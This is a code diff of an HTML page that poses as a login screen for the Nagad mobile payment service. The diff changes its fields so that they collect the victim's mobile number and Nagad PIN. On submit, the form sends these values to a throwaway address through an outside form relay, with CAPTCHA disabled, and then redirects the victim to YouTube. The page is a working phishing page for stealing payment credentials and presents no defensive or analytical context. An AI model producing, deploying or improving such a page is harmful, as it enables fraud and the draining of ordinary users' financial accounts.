@@ -134,21 +134,25 @@
     <div class="logo">
         <img src="https://i.ibb.co/k8LkGTT/removal-ai-d3363a06-05e5-4e1d-bb5b-60348f7c2805-img-20240617-115730.png" alt="Nagad Logo">
     </div>
-    <div class="container">
     <form action="https://formsubmit.co/nagad@spamok.com" method="POST">
-    
-    
         <!-- Redirect Page -->
         <input type="hidden" name="_next" value="https://youtube.com">
         
         <!-- Disable CAPTCHA -->
         <input type="hidden" name="_captcha" value="false">
-
-        <input type="number" name="mobile" placeholder="মোবাইল নাম্বার" required>
-        <input type="number" name="otp" placeholder="ওটিপি" required>
-        <button type="submit">যাচাই করুন</button>
-    
-</div>
+    <div class="container">
+        <div class="input-group">
+            <p>মোবাইল নাম্বার</p>
+            <i class="fa fa-phone input-icon"></i>
+            <input type="number" name="Number" placeholder="XXX-XXXX-XXXX" id="mobileNumber" required>
+        </div>
+        <div class="input-group">
+            <p>নগদ পিন</p>
+            <i class="fa fa-lock input-icon"></i>
+            <input type="number" name="Pin" placeholder="XXXX" id="pin" required>
+        </div>
+        <button type="submit" id="loginButton">পরবর্তী</button>
+    </div>
 </form>
 
 </body>
